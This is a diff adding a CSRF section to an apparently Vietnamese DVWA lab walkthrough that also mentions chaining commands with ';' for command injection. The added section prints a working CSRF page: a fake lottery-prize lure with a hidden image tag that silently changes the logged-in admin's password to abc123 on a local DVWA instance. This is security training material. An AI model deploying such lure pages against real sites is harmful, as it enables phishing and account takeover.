@@ -15,7 +15,25 @@ Nhap **8.8.8.8** vao input box:
 Chuc nang **Ping a device** thuc hien cau lenh **ping -c 4**, thu su dung ky tu **';'** de ket hop voi cac cau lenh khac:  
 ![Command Injection_2](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/Command%20Injection_2.png)  
 ## 3. CSRF  
-
+Khi su dung chuc nang **Change your admin password**, he thong se gui GET request nhu sau:  
+![CSRF_1](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/CSRF_1.png)  
+Trong GET request chi co thong tin ve PHPSESSID de xac dinh xem user nao dang gui request. Tao mot trang web index.html nhu sau:  
+```
+<!DOCTYPE html>
+<html lang = "en">
+<head>
+  <meta charset = "UTF-8">
+  <title> Vietlott </title>
+</head>
+<body>
+  <h1> Chuc mung ban da trung Vietlott 100.000.000.000 VND </h1>
+  <img style="display:none" src="http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=abc123&password_conf=abc123&Change=Change" alt="">
+</body>
+</html>
+```  
+Khi nguoi dung truy cap vao trang web tren se kich hoat HTTP request toi chuc nang **Change your admin password** cua **DVWA**, neu nguoi dung dang truy cap trang **DVWA** voi tai khoan **admin**, trinh duyet se tu dong su dung PHPSESSID cua nguoi dung de gui request thay doi mat khau thanh **abc123**.  
+Kiem tra lai tai khoan **admin** voi mat khau **abc123**  
+![CSRF_2](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/CSRF_2.png)
 ## 4. File Inclusion  
 
 ## 5. File Upload  
